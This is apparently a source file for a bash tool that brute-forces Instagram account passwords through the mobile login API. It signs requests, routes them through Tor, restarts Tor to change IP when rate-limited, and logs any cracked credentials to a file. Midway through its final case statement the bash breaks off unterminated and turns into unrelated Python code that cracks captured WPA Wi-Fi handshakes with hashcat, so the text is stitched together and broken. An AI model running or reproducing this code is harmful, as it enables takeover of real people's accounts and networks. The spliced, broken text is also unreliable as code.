function start() {
banner

dependencies
read -p $'\e[1;92mUsername account: \e[0m' user
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instashell --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor
#sleep 3

}

function bruteforcer() {


count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"

startline=1
endline="$threads"
while [ true ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.passwords ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.passwords ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
let startline+=$threads
let endline+=$threads
changeip
done
}



function resume() {

banner 

counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads="10"
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
startline="$threads"
while [ true ]; do
IFS=$'\n'
for pass in $(sed -n '/'$pass'/,'$startline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android Iphone (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
let startline+=$threads
changeip
done
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
# Convert the .pcap file into .hc22000
hc22000_file = "wpa_crack.hc22000"
subprocess.run(["hcxpcapngtool", "-o", hc22000_file, input_file])

print("  _____________________________________________________________________________________________\n")
print("  ---------------------------------------------------------------------------------------------\n")

# Brute force attack
charset = string.printable  # Define the character set to be used (e.g. "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPRSTUVWXYZ"), string.printable contains all kind of printable characters

password_found = False
password_length = 1

while not password_found:
    for password in itertools.product(charset, repeat=password_length):
        password = ''.join(password)
        result = subprocess.run(["hashcat", "-m", "22000", hc22000_file, password], capture_output=True)
        if "Cracked" in result.stdout.decode():
            print(f"Password found: {password}")
            password_found = True
            break
    password_length += 1

# Delete the hc22000 file
os.remove(hc22000_file)
print("  _____________________________________________________________________________________________\n")
print("  ---------------------------------------------------------------------------------------------\n")

charset = string.printable  # Define the character set to be used

def timeout_handler(signum, frame):
    raise TimeoutError("Timeout expired. Password not found.")

# Set the timeout to 120" = 2' (2 minutes is a very low time, and this is just for example) 
timeout = 120

# Set the manager of signals for SIGALRM (the alarm)
signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(timeout)

# Brute force attack
try:
    password_length = 1
    while True:
        for password in itertools.product(charset, repeat=password_length):
            password = ''.join(password)
            result = subprocess.run(["hashcat", "-m", "22000", hc22000_file, password], capture_output=True)
            if "Cracked" in result.stdout.decode():
                print(f"Password found: {password}")
                raise SystemExit(0)  # Terminate the script if the password is found
        password_length += 1
except TimeoutError as e:
    print(str(e))
finally:
    signal.alarm(0)
    print("  _____________________________________________________________________________________________\n")
print("  ---------------------------------------------------------------------------------------------\n")

# Prompt for wordlist file
wordlist_file = ""
while True:
    wordlist_file = input("Now insert wordlist file's NAME or PATH: ")
    if wordlist_file.endswith(".txt") and os.path.isfile(wordlist_file):
        break
    else:
        print("Invalid wordlist file. Please make sure the file exists and has a valid format.")

# Import the .hc22000 file into hashcat, find out the password, and show it
subprocess.run(["hashcat", "-m", "22000", hc22000_file, wordlist_file, "--show"])

# Delete the hc22000 file
os.remove(hc22000_file)
